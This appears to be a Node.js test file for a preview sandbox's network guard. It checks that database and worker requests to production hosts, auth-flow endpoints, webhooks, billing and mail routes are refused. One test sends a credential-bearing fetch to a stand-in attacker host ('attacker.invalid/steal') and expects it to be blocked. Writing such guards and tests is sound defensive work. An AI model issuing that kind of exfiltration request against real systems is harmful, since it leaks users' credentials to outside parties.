import test from 'node:test';
import assert from 'node:assert/strict';
import {allowedDatabaseRequest,allowedWorkerRoute,DB_ORIGIN,LAB_CSP,labFetch} from '../network.mjs';
import {rewriteDestinations,validateSettings} from '../prepare-preview.mjs';
test('database egress refuses production, redirects, writes and email operations',()=>{
 for(const url of ['https://cuxlwaocjqwzluycznyp.supabase.co/rest/v1/moment_events',DB_ORIGIN+'.evil.invalid/rest/v1/moment_events','https://api.resend.com/emails']) assert.equal(allowedDatabaseRequest(url),false);
 for(const path of ['/auth/v1/signup','/auth/v1/recover','/auth/v1/invite','/rest/v1/rpc/erase_my_moment_account','/rest/v1/rpc/admin_reset_moment_unit_for_resale']) assert.equal(allowedDatabaseRequest(DB_ORIGIN+path,'POST'),false);
 assert.equal(allowedDatabaseRequest(DB_ORIGIN+'/rest/v1/moment_events','PATCH'),false);
 assert.equal(allowedDatabaseRequest(DB_ORIGIN+'/auth/v1/token?grant_type=password','POST'),true);
 assert.equal(allowedDatabaseRequest(DB_ORIGIN+'/auth/v1/token?grant_type=magiclink','POST'),false);
 assert.equal(allowedDatabaseRequest(DB_ORIGIN+'/rest/v1/moment_events'),true);
});
test('worker laboratory routes exclude cron, billing, business, mail and webhooks',()=>{
 for(const p of ['/webhooks/stripe','/api/cron/moment-anniversaries','/api/moment/invite','/api/moment/transfer','/api/moment/support-notify','/api/moment/activation-notify','/api/business/internationalize'])assert.equal(allowedWorkerRoute(p,'POST'),false);
 assert.equal(allowedWorkerRoute('/api/media/upload','POST'),true);
 assert.equal(allowedWorkerRoute('/m/fake','GET'),true);
 assert.equal(allowedWorkerRoute('/p/business','GET'),false);
});
test('generated destinations and CSP exclude production origins',()=>{
 const source='https://app.khamakeymoments.com https://link.khamakeymoments.com https://cuxlwaocjqwzluycznyp.supabase.co';
 assert.doesNotMatch(rewriteDestinations(source),/khamakeymoments.com|cuxlwa/);
 assert.doesNotMatch(LAB_CSP,/supabase.co|khamakeymoments.com|connect-src[^;]*https:/);
 assert.throws(()=>validateSettings({project:'production',key:'sb_publishable_fake'}));
});
test('outbound fetch refuses a credential-bearing URL before network access',async()=>{
 await assert.rejects(labFetch('https://attacker.invalid/steal',{headers:{Authorization:'test-only'}}),/blocked/);
});
